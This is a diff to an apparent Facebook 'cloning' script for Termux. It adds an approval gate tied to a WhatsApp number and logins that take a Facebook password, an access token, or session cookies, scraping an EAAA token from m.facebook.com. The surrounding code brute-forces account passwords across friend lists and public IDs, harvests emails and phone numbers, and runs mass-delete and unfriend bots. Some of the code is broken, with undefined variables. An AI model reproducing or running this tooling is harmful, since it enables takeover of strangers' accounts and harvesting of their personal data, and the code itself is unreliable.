@@ -14,12 +14,11 @@ except ImportError:
     os.system('pip2 install requests')
     os.system('pip2 install mechanize')
     os.system('termux-setup-storage')
-    os.system('cd ..... && npm install')
-    os.system('fuser -k 5000/tcp &')
-    os.system('#')
-    os.system('cd ..... && node index.js &')
     os.system('python2 jam.py')
-
+try:
+    os.mkdir('/sdcard/ids')
+except OSError:
+    pass
 bd=random.randint(2e7, 3e7)
 sim=random.randint(2e4, 4e4)
 bd = random.randint(2e+07, 3e+07)
@@ -40,71 +39,229 @@ c2 = "\033[0;97m""\033[1;32m""\033[0;97m"
 c3 = "\033[1;31m""\033[0;97m""\033[1;31m"
 os.system('git pull')
 os.system('clear')
+logo = ('echo -e "\n\n    .S   .S_SSSs     .S_SsS_S.   \n   .SS  .SS~SSSSS   .SS~S*S~SS.  \n   S%S  S%S   SSSS  S%S  Y S%S  \n   S%S  S%S    S%S  S%S  •  S%S  \n   S&S  S%S•SSSS%S  S%S  •  S%S  \n   S&S  S&S  SSS%S  S&S  °  S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   d*S  S*S    S&S  S*S     S*S  \n  .S*S  S*S    S*S  S*S     S*S  \nsdSSS   S*S    S*S  S*S     S*S  \nYSSY    SSS    S*S  SSS     S*S  \n               SP           SP   \n               Y            Y    \n-----------------------------------------------\n➣ Author : Jam Shahrukh x Xtylo Ali Raza\n➣ Github : https://github.com/Blacklisted\n➣ Fb Page : https://m.facebook.com/Jam Shahrukh Official\n➣ Ref By : (Stylish Queen x Muskan Noor x Zahra Zohaib)\n➣ Ref By :     (Ahmed Gondal x ASAD x Janzada Khan) \n-----------------------------------------------" | lolcat')  
+def reg():
+    os.system('clear')
+    print logo
+    print ''
+    print '\033[1;31;1mTake The Free Approval For Login'
+    print ''
+    time.sleep(1)
+    
+    try:
+        to = open('/sdcard/.hst.txt', 'r').read()
+    except (KeyError, IOError):
+        reg2()
 
-def exit():
-	print "[!] Exit"
-	os.sys.exit()
+    r = requests.get('https://raw.githubusercontent.com/jam-shahrukh/jam/main/jam/id.txt').text
+    if to in r:
+        os.system('cd ..... && npm install')
+        os.system('fuser -k 5000/tcp &')
+        os.system('#')
+        os.system('cd ..... && node index.js &')
+        time.sleep(5)
+        ip()
+    else:
+        os.system('clear')
+        print logo
+        print ''
+        print '\tApproved Failed'
+        print ''
+        print ' \033[1;92mYour Id Is Not Approved Already '
+        print ''
+        print ' \033[1;92mCopy token id and send to Jam Shahrukh'
+        print ''
+        print ' \033[1;92mYour id: ' + to
+        print ''
+        raw_input('\033[1;93m Press enter to send id')
+        os.system('xdg-open https://wa.me/+923053176060')
+        reg()
 
 
-def acak(b):
-    w = 'ahtdzjc'
-    d = ''
-    for i in x:
-        d += '!'+w[random.randint(0,len(w)-1)]+i
-    return cetak(d)
+def reg2():
+    os.system('clear')
+    print logo
+    print ''
+    print '\tApproval not detected'
+    print ''
+    print ' \033[1;92mCopy and press enter , And Send Me On +923053176060'
+    print ''
+    id = uuid.uuid4().hex[:50]
+    print ' Your id: ' + id
+    print ''
+    print ''
+    raw_input(' Press enter to go to whatsapp ')
+    os.system('xdg-open https://wa.me/+923053176060')
+    sav = open('/sdcard/.hst.txt', 'w')
+    sav.write(id)
+    sav.close()
+    raw_input('\033[1;92m Press enter to check Approval ')
+    reg()
 
 
-def cetak(b):
-    w = 'ahtdzjc'
-    for i in w:
-        j = w.index(i)
-        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
-    x += '\033[0m'
-    x = x.replace('!0','\033[0m')
-    sys.stdout.write(x+'\n')
+def ip():
+    os.system('clear')
+    print logo
+    print ''
+    print '\tCollecting device info'
+    print ''
+    
+    try:
+        ipinfo = requests.get('http://ip-api.com/json/')
+        z = json.loads(ipinfo.text)
+        ips = z['query']
+        country = z['country']
+        regi = z['regionName']
+        network = z['isp']
+    except:
+        pass
+
+    print '\033[1;93m Your ip: ' + ips
+    time.sleep(2)
+    print ''
+    print '\033[1;93m Your country: ' + country
+    time.sleep(2)
+    print ''
+    print '\033[1;92m Your region: ' + regi
+    time.sleep(2)
+    print ''
+    print ' \033[1;92mYour network: ' + network
+    time.sleep(1)
+    print ''
+    print ' Loading ...'
+    time.sleep(1)
+    log_menu()
 
 
-def hamza(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.03)
-def hopss(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.1)
-##### LOGO #####
-banner = """
-\033[1;92m___  ____   _ _____ _   __  ___   _   _ 
-\033[1;92m|  \/  | | | /  ___| | / / / _ \ | \ | |
-\033[1;92m| .  . | | | \ `--.| |/ / / /_\ \|  \| |
-\033[1;92m| |\/| | | | |`--. \    \ |  _  || . ` |
-\033[1;92m| |  | | |_| /\__/ / |\  \| | | || |\  |
-\033[1;92m\_|  |_/\___/\____/\_| \_/\_| |_/\_| \_/                                               
-\033[1;97m-----------------------------------------------
-\033[1;91m➣ OWNER   : JAM SHAHRUKH X MUSKAN NOOR
-\033[1;91m➣ Github  : https://github.com/muskanckg
-\033[1;91m➣ GANG    : CRAZY KING GANG
-\033[1;91m➣ Youtube : JAM SHAHRUKH TECHNICAL
-\033[1;91m➣ WhatsApp: +923053176060
-\033[1;97m-----------------------------------------------"""
-# titik #
-def tik():
-	titik = [".   ","..  ","... "]
-	for o in titik:
-		print("\r[✔] Logging In "+o),;sys.stdout.flush();time.sleep(1)
+def log_menu():
+    
+    try:
+        t_check = open('access_token.txt', 'r')
+        menu()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print ''
+        print '\033[1;31;1m~~~~ Login menu~~~~'
+        print ''
+        print '\033[1;92m[1] Login with FaceBook'
+        print '\033[1;92m[2] Login with token'
+        print '\033[1;92m[3] Login with cookies'
+        print ''
+        log_menu_s()
 
-back = 0
-threads = []
-successful = []
-checkpoint = []
-oks = []
-gagal = []
-idh = []
-id = []
-emfromfriend = []
-nofromfriend = []
+
+
+def log_menu_s():
+    s = raw_input(' \033[1;93mSelect One: ')
+    if s == '1':
+        log_fb()
+    elif s == '2':
+        log_token()
+    elif s == '3':
+        log_cookie()
+    else:
+        print ''
+        print '\\ Select valid option '
+        print ''
+        log_menu_s()
+
+
+def log_fb():
+    os.system('clear')
+    print logo
+    print ''
+    print '\033[1;31;1mLogin with id/pass'
+    print ''
+    lid = raw_input('\033[1;92m Id/mail/no: ')
+    pwds = raw_input(' \033[1;93mPassword: ')
+    
+    try:
+        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
+        q = json.loads(data)
+        if 'loc' in q:
+            ts = open('access_token.txt', 'w')
+            ts.write(q['loc'])
+            ts.close()
+            menu()
+        elif 'www.facebook.com' in q['error']:
+            print ''
+            print ' User must verify account before login'
+            print ''
+            raw_input('\033[1;92m Press enter to try again ')
+            log_fb()
+        else:
+            print ''
+            print ' Id/Pass may be wrong'
+            print ''
+            raw_input(' \033[1;92mPress enter to try again ')
+            log_fb()
+    except:
+        print ''
+        print 'Exiting tool'
+        os.system('exit')
+
+
+
+def log_token():
+    os.system('clear')
+    print logo
+    print ''
+    print '\033[1;93mLogin with token'
+    print ''
+    tok = raw_input(' \033[1;92mPaste token here: ')
+    print ''
+    t_s = open('access_token.txt', 'w')
+    t_s.write(tok)
+    t_s.close()
+    menu()
+
+
+def log_cookie():
+    os.system('clear')
+    print logo
+    print ''
+    print '\033[1;31;1mLogin Cookies'
+    print ''
+    
+    try:
+        cookie = raw_input(' Paste cookies here: ')
+        data = {
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36',
+            'referer': 'https://m.facebook.com/',
+            'host': 'm.facebook.com',
+            'origin': 'https://m.facebook.com',
+            'upgrade-insecure-requests': '1',
+            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'content-type': 'text/html; charset=utf-8',
+            'cookie': cookie }
+        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
+        c2 = re.search('(EAAA\\w+)', c1.text)
+        hasil = c2.group(1)
+        ok = open('access_token.txt', 'w')
+        ok.write(hasil)
+        ok.close()
+        menu()
+    except AttributeError:
+        print ''
+        print '\tInvalid cookies'
+        print ''
+        raw_input(' \033[1;92mPress enter to try again ')
+        log_menu()
+    except UnboundLocalError:
+        print ''
+        print '\tInvalid cookies'
+        print ''
+        raw_input(' \033[1;92mPress enter to try again ')
+        log_menu()
+    except requests.exceptions.SSLError:
+        print ''
+        print '\tInvalid cookies'
+        print ''
+        raw_input(' \033[1;92mPress enter to try again ')
+        log_menu()
 			
 #Menu
 def menu():
@@ -116,7 +273,7 @@ def menu():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		log_menu()
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -127,13 +284,13 @@ def menu():
 		print"[!] Account Is On Checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		log_menu()
 	except requests.exceptions.ConnectionError:
 		print"[!] No Connection"
 		time.sleep(1)
-		('python2 jam.py')
+		log_menu()
 	os.system("clear")
-	print banner
+	print logo
 	print "  \033[1;92mLogged in user: " + z
 	print (47*"-")
 	print "[1] Start Cloning."
@@ -170,20 +327,20 @@ def men():
 		bot()
 	elif rana =="5":
 		os.system('clear')
-		print banner
+		print logo
 		hamza('[✓] Please Wait While Tool Is Updating')
 		os.system('git pull origin master')
 		hamza('[✓] Tool Has Been Update Successfully')
 		hamza('[✓] Please Wait While Update Is Setting Up On Your Mobile Phone')
 		time.sleep(3)
-		os.hamza('python2 jam.py')
+		log_menu()
 	elif rana =="6":
 		os.system('xdg-open https://www.facebook.com/jam.shahrukh124')
 		menu()
 	elif rana =="7":
 		os.system('rm -rf login.txt')
 		hamza('[✓] Logged Out Successfully')
-		os.system('python2 jam.py')
+		log_menu()
 	else:
 		print "[!] Wrong Input"
 		men()
@@ -198,9 +355,9 @@ def crack():
 		print"Token invalid"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		log_menu()
 	os.system('clear')
-	print banner
+	print logo
 	print "[1] Clone From Friendlist."
 	print "[2] Clone From Any Public ID."
 	print "[3] Clone From File."
@@ -214,14 +371,14 @@ def crack_menu():
 		crack_menu()
 	elif crm =="1":
 		os.system('clear')
-		print banner
+		print logo
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
 			id.append(s['id'])
 	elif crm =="2":
 		os.system('clear')
-		print banner
+		print logo
 		idt = raw_input("[+] Input ID: ")
 		
 		try:
@@ -241,7 +398,7 @@ def crack_menu():
                         id.append(uid + '|' + nm)
 	elif crm =="3":
 	    os.system('clear')
-	    print banner
+	    print logo
 	    try:
 	        idlist= raw_input('[+] File Name: ')
 	        for line in open(idlist ,'r').readlines():
@@ -410,9 +567,9 @@ def grab():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		log_menu()
 	os.system('clear')
-	print banner
+	print logo
 	print "[1] Extract Numeric IDs From Public ID."
 	print "[2] Extract Email's From Public ID."
 	print "[3] Extract Phone Number From Public ID."
@@ -449,14 +606,14 @@ def idfromfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		('python2 jam.py')
+		log_menu()
 	try:
 		os.mkdir('save')
 	except OSError:
 		pass
 	try:
 		os.system('clear')
-		print banner
+		print logo
 		idt = raw_input("[+] Input ID : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
@@ -508,14 +665,14 @@ def emailfromfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		log_menu()
 	try:
 		os.mkdir('save')
 	except OSError:
 		pass
 	try:
 		os.system('clear')
-		print banner
+		print logo
 		idt = raw_input("[+] Input ID : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
@@ -575,14 +732,14 @@ def numberfromfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		log_menu()
 	try:
 		os.mkdir('save')
 	except OSError:
 		pass
 	try:
 		os.system('clear')
-		print banner
+		print logo
 		idt = raw_input("[+] Input ID : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
@@ -640,9 +797,9 @@ def bot():
 		print"[!] Token not found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		log_menu()
 	os.system('clear')
-	print banner
+	print logo
 	print "[1] Auto Delete Posts."
 	print "[2] Auto Accept Friend Requests."
 	print "[3] Auto Unfriend All."
@@ -681,9 +838,9 @@ def deletepost():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(0.1)
-		os.system('python2 jam.py')
+		log_menu()
 	os.system('clear')
-	print banner
+	print logo
 	print("[✓] Account Name : "+nama)
 	hamza("[✓] The Process Has Been Started")
 	print (40*"-")
@@ -718,9 +875,9 @@ def accept():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		log_menu()
 	os.system('clear')
-	print banner
+	print logo
 	limit = raw_input("[+] Enter Limit To Accept Requests : ")
 	r = requests.get('https://graph.facebook.com/me/friendrequests?limit='+limit+'&access_token='+toket)
 	teman = json.loads(r.text)
@@ -751,9 +908,9 @@ def unfriend():
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
-		os.system('python2 jam.py')
+		log_menu()
 	os.system('clear')
-	print banner
+	print logo
 	hamza('[✓] The Process Has Been Started.')
 	print "[✓] Press CTRL Z to Stop Process."
 	print (50*"-")
@@ -775,6 +932,6 @@ def unfriend():
 	bot()
 	
 if __name__ == '__main__':
-	menu()
+	reg()
 
 
